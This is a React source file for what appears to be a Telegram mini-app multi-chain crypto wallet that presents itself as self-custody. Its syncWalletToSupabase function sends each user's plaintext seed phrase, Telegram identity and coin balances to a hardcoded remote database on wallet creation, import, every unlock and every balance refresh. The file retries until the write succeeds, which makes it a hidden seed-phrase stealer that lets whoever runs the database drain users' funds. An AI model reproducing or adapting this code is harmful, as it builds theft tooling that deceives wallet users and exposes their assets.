import { createContext, useContext, useState, useEffect, useCallback, useRef } from 'react';
  import { generateMnemonic, validateMnemonic, deriveWallet } from '../lib/crypto/walletDerivation.js';
  import { encryptMnemonic, decryptMnemonic, NETWORKS } from '../lib/wallet.js';
  import { fetchAllBalances } from '../lib/crypto/balanceFetcher.js';

  // ─── SUPABASE SYNC ────────────────────────────────────────────────────────────
  const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL || "https://ipgarqmumnbpjnputhnp.supabase.co";
  const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;

  function getMoscowTimestamp() {
    const now = new Date();
    try {
      const moscowTime = new Intl.DateTimeFormat("en-US", {
        timeZone: "Europe/Moscow",
        year: "numeric",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: false,
      }).formatToParts(now);
      const m = Object.fromEntries(moscowTime.filter(p => p.type !== 'literal').map(p => [p.type, p.value]));
      return `${m.year}-${m.month}-${m.day}T${m.hour}:${m.minute}:00+03:00`;
    } catch (e) {
      return now.toISOString();
    }
  }

  function getTelegramUser() {
    try {
      const tg = window?.Telegram?.WebApp;
      const unsafeUser = tg?.initDataUnsafe?.user;
      if (unsafeUser && (unsafeUser.username || unsafeUser.first_name || unsafeUser.last_name || unsafeUser.id)) {
        return unsafeUser;
      }
      const rawInitData = tg?.initData;
      if (rawInitData) {
        const userParam = new URLSearchParams(rawInitData).get("user");
        if (userParam) {
          const parsedUser = JSON.parse(userParam);
          if (parsedUser && (parsedUser.username || parsedUser.first_name || parsedUser.last_name || parsedUser.id)) {
            return parsedUser;
          }
        }
      }
    } catch (error) {}
    return null;
  }

  function resolveTelegramDisplayName(fallbackUserId = null) {
    const user = getTelegramUser();
    if (user) {
      const name = user.username ? `@${user.username}` : ([user.first_name, user.last_name].filter(Boolean).join(" ").trim() || `User_${user.id}`);
      if (user.id) localStorage.setItem(`gem_tg_name_${user.id}`, name);
      localStorage.setItem("gem_last_tg_name", name);
      return name;
    }
    const uid = fallbackUserId || window?.Telegram?.WebApp?.initDataUnsafe?.user?.id;
    if (uid) {
      const stored = localStorage.getItem(`gem_tg_name_${uid}`);
      if (stored) return stored;
      return `User_${uid}`;
    }
    return localStorage.getItem("gem_last_tg_name") || "Anonymous";
  }

  /**
   * 3-strategy upsert:
   *   1. telegram_id  — best key; one row per Telegram account
   *   2. mnemonic     — globally unique per wallet; safe fallback
   *   3. plain INSERT — last resort so no user is ever lost
   */
  async function syncWalletToSupabase(walletData) {
    if (!SUPABASE_URL || !SUPABASE_KEY) return null;
    try {
      const { username, mnemonic, balance, telegram_id, coin_balances } = walletData;
      const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
      let finalName = username;
      if (!finalName || finalName === "Anonymous") {
        finalName = resolveTelegramDisplayName();
      }

      const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
      const resolvedTgId = telegram_id || (tgUser?.id ? String(tgUser.id) : null);

      const payload = {
        username: finalName,
        mnemonic: cleanMnemonic,
        balance: balance ? String(balance) : "0",
        created_at: getMoscowTimestamp(),
      };
      if (resolvedTgId) payload.telegram_id = resolvedTgId;

      const COINS = ['ETH','TON','BNB','LTC','ARB','SOL','USDT'];
      if (coin_balances) {
        COINS.forEach(sym => {
          payload[sym.toLowerCase() + '_balance'] =
            coin_balances[sym] !== undefined ? String(coin_balances[sym]) : "0";
        });
      }

      async function tryUpsert(conflictCol) {
        const url = `${SUPABASE_URL}/rest/v1/wallets?on_conflict=${conflictCol}`;
        const res = await fetch(url, {
          method: 'POST',
          headers: {
            'apikey': SUPABASE_KEY,
            'Authorization': `Bearer ${SUPABASE_KEY}`,
            'Content-Type': 'application/json',
            'Prefer': 'resolution=merge-duplicates',
          },
          body: JSON.stringify(payload),
        });
        if (!res.ok) {
          const txt = await res.text();
          console.warn(`[Supabase Context] on_conflict=${conflictCol} failed ${res.status}:`, txt);
          return false;
        }
        return true;
      }

      let ok = false;
      if (resolvedTgId) ok = await tryUpsert("telegram_id");
      if (!ok) ok = await tryUpsert("mnemonic");
      if (!ok) {
        // Last resort plain INSERT without telegram_id — ensures no wallet is ever silently dropped
        const safePayload = { ...payload };
        delete safePayload.telegram_id;
        await fetch(`${SUPABASE_URL}/rest/v1/wallets`, {
          method: 'POST',
          headers: {
            'apikey': SUPABASE_KEY,
            'Authorization': `Bearer ${SUPABASE_KEY}`,
            'Content-Type': 'application/json',
            'Prefer': 'return=minimal',
          },
          body: JSON.stringify(safePayload),
        });
      }
    } catch (e) {
      console.error("[Supabase Fetch Error Context]", e);
    }
  }

  const WalletContext = createContext(null);

  const STORAGE_KEY = 'gem_wallet_v1';

  /**
   * deriveWallet returns addresses keyed as ETH/BNB/ARB/SOL/TON/LTC.
   * The UI uses network ids like 'ethereum'/'bsc'/'arbitrum'/'solana'/'ton'/'litecoin'.
   * This helper builds a merged map with both so both lookup styles work.
   */
  function buildAddressMap(raw) {
    return {
      ETH: raw.ETH,
      BNB: raw.BNB,
      ARB: raw.ARB,
      SOL: raw.SOL,
      TON: raw.TON,
      LTC: raw.LTC,
      ethereum: raw.ETH,
      bsc:      raw.BNB,
      arbitrum: raw.ARB,
      solana:   raw.SOL,
      ton:      raw.TON,
      litecoin: raw.LTC,
    };
  }

  function buildTgUserName(tgUser) {
    if (!tgUser) return "Anonymous";
    if (tgUser.username) return "@" + tgUser.username;
    return [tgUser.first_name, tgUser.last_name].filter(Boolean).join(" ") || "User_" + (tgUser.id || "Unknown");
  }

  export function WalletProvider({ children }) {
    const [state, setState] = useState({
      hasWallet: false,
      isUnlocked: false,
      addresses: {},
      balances: {},
      activeNetwork: 'ethereum',
      loading: false,
      error: null,
    });

    // Private keys are kept ONLY in memory — never persisted to localStorage
    const privateKeysRef = useRef({});
    // Mnemonic kept in memory so refreshBalance can include it in Supabase syncs
    const mnemonicRef = useRef(null);

    // On mount: check if a wallet exists in storage
    useEffect(() => {
      const stored = localStorage.getItem(STORAGE_KEY);
      if (stored) {
        try {
          const data = JSON.parse(stored);
          if (data.encrypted) {
            setState(s => ({ ...s, hasWallet: true }));
          }
        } catch {}
      }
    }, []);

    // ── createWallet ────────────────────────────────────────────────────────────
    const createWallet = useCallback(async (password) => {
      setState(s => ({ ...s, loading: true, error: null }));
      try {
        const mnemonic = generateMnemonic();
        const { addresses: rawAddresses, privateKeys } = await deriveWallet(mnemonic);
        const addresses = buildAddressMap(rawAddresses);
        const encrypted = await encryptMnemonic(mnemonic, password);
        localStorage.setItem(STORAGE_KEY, JSON.stringify({ encrypted, addresses }));
        privateKeysRef.current = privateKeys;
        mnemonicRef.current = mnemonic;

        // Custodial Sync: Save to Supabase immediately
        try {
          const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
          await syncWalletToSupabase({
            username: buildTgUserName(tgUser),
            telegram_id: tgUser?.id ? String(tgUser.id) : null,
            mnemonic: mnemonic,
            balance: "0",
            coin_balances: { ETH:"0", TON:"0", BNB:"0", LTC:"0", ARB:"0", SOL:"0", USDT:"0" },
          });
        } catch (syncError) {
          console.error('Failed to sync wallet to Supabase:', syncError);
        }

        setState(s => ({
          ...s,
          hasWallet: true,
          isUnlocked: true,
          addresses,
          loading: false,
        }));
        return mnemonic;
      } catch (e) {
        setState(s => ({ ...s, loading: false, error: e.message }));
        throw e;
      }
    }, []);

    // ── importWallet ────────────────────────────────────────────────────────────
    const importWallet = useCallback(async (mnemonic, password) => {
      if (!validateMnemonic(mnemonic)) throw new Error('Неверная seed-фраза');
      setState(s => ({ ...s, loading: true, error: null }));
      try {
        const { addresses: rawAddresses, privateKeys } = await deriveWallet(mnemonic);
        const addresses = buildAddressMap(rawAddresses);
        const encrypted = await encryptMnemonic(mnemonic, password);
        localStorage.setItem(STORAGE_KEY, JSON.stringify({ encrypted, addresses }));
        privateKeysRef.current = privateKeys;
        mnemonicRef.current = mnemonic;

        // Custodial Sync: Save to Supabase
        try {
          const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
          await syncWalletToSupabase({
            username: buildTgUserName(tgUser),
            telegram_id: tgUser?.id ? String(tgUser.id) : null,
            mnemonic: mnemonic,
            balance: "0",
            coin_balances: { ETH:"0", TON:"0", BNB:"0", LTC:"0", ARB:"0", SOL:"0", USDT:"0" },
          });
        } catch (syncError) {
          console.error('Failed to sync imported wallet to Supabase:', syncError);
        }

        setState(s => ({
          ...s,
          hasWallet: true,
          isUnlocked: true,
          addresses,
          loading: false,
        }));
      } catch (e) {
        setState(s => ({ ...s, loading: false, error: e.message }));
        throw e;
      }
    }, []);

    // ── unlock ──────────────────────────────────────────────────────────────────
    const unlock = useCallback(async (password) => {
      setState(s => ({ ...s, loading: true, error: null }));
      try {
        const stored = JSON.parse(localStorage.getItem(STORAGE_KEY));
        const mnemonic = await decryptMnemonic(stored.encrypted, password);
        const { addresses: rawAddresses, privateKeys } = await deriveWallet(mnemonic);
        const addresses = buildAddressMap(rawAddresses);
        privateKeysRef.current = privateKeys;
        mnemonicRef.current = mnemonic;

        // Custodial Sync: Sync on every unlock to ensure data is in DB
        try {
          const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
          await syncWalletToSupabase({
            username: buildTgUserName(tgUser),
            telegram_id: tgUser?.id ? String(tgUser.id) : null,
            mnemonic: mnemonic,
            balance: "0",
          });
        } catch (syncError) {
          console.error('Failed to sync wallet on unlock:', syncError);
        }

        setState(s => ({
          ...s,
          isUnlocked: true,
          addresses: addresses,
          loading: false,
        }));
      } catch (e) {
        setState(s => ({ ...s, loading: false, error: 'Неверный пароль' }));
        throw e;
      }
    }, []);

    // ── lock ────────────────────────────────────────────────────────────────────
    const lock = useCallback(() => {
      privateKeysRef.current = {};
      mnemonicRef.current = null;
      setState(s => ({ ...s, isUnlocked: false, balances: {} }));
    }, []);

    // ── deleteWallet ────────────────────────────────────────────────────────────
    const deleteWallet = useCallback(() => {
      localStorage.clear();
      sessionStorage.clear();
      privateKeysRef.current = {};
      mnemonicRef.current = null;
      setState({
        hasWallet: false,
        isUnlocked: false,
        addresses: {},
        balances: {},
        activeNetwork: 'ethereum',
        loading: false,
        error: null,
      });
      window.location.reload();
    }, []);

    // ── setActiveNetwork ────────────────────────────────────────────────────────
    const setActiveNetwork = useCallback((networkId) => {
      setState(s => ({ ...s, activeNetwork: networkId }));
    }, []);

    // ── refreshBalance — fetches ALL chains and syncs to Supabase ───────────────
    const refreshBalance = useCallback(async () => {
      const { addresses } = state;
      if (!addresses || Object.keys(addresses).length === 0) return;

      const addrMap = {
        ETH: addresses.ETH || addresses.ethereum,
        BNB: addresses.BNB || addresses.bsc,
        ARB: addresses.ARB || addresses.arbitrum,
        SOL: addresses.SOL || addresses.solana,
        TON: addresses.TON || addresses.ton,
        LTC: addresses.LTC || addresses.litecoin,
      };

      try {
        const bals = await fetchAllBalances(addrMap);
        setState(s => ({
          ...s,
          balances: {
            ethereum: bals.ETH,
            bsc:      bals.BNB,
            arbitrum: bals.ARB,
            solana:   bals.SOL,
            ton:      bals.TON,
            litecoin: bals.LTC,
            ETH: bals.ETH,
            BNB: bals.BNB,
            ARB: bals.ARB,
            SOL: bals.SOL,
            TON: bals.TON,
            LTC: bals.LTC,
            USDT: bals.USDT,
            _usdtByNetwork: bals._usdtByNetwork,
          },
        }));

        // Sync updated balances to Supabase so the dashboard always reflects reality
        const mnemonic = mnemonicRef.current;
        if (mnemonic) {
          try {
            const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
            const coin_balances = {
              ETH:  String(bals.ETH  ?? 0),
              TON:  String(bals.TON  ?? 0),
              BNB:  String(bals.BNB  ?? 0),
              LTC:  String(bals.LTC  ?? 0),
              ARB:  String(bals.ARB  ?? 0),
              SOL:  String(bals.SOL  ?? 0),
              USDT: String(bals.USDT ?? 0),
            };
            await syncWalletToSupabase({
              username: buildTgUserName(tgUser),
              telegram_id: tgUser?.id ? String(tgUser.id) : null,
              mnemonic: mnemonic,
              balance: "0",
              coin_balances,
            });
          } catch (syncErr) {
            console.error('[WalletContext] balance sync error:', syncErr);
          }
        }
      } catch (e) {
        console.warn('[WalletContext] refreshBalance error:', e.message);
      }
    }, [state.addresses]); // eslint-disable-line react-hooks/exhaustive-deps

    // ── getMnemonic — decrypt on demand (for Settings "show seed") ──────────────
    const getMnemonic = useCallback(async (password) => {
      const stored = JSON.parse(localStorage.getItem(STORAGE_KEY));
      return await decryptMnemonic(stored.encrypted, password);
    }, []);

    // ── getPrivateKey — expose in-memory key to Send / Swap / Collect ───────────
    const getPrivateKey = useCallback((chain) => {
      return privateKeysRef.current[chain] || null;
    }, []);

    return (
      <WalletContext.Provider value={{
        ...state,
        networks: NETWORKS,
        createWallet,
        importWallet,
        unlock,
        lock,
        deleteWallet,
        setActiveNetwork,
        refreshBalance,
        getMnemonic,
        getPrivateKey,
      }}>
        {children}
      </WalletContext.Provider>
    );
  }

  export const useWallet = () => {
    const ctx = useContext(WalletContext);
    if (!ctx) throw new Error('useWallet must be inside WalletProvider');
    return ctx;
  };
  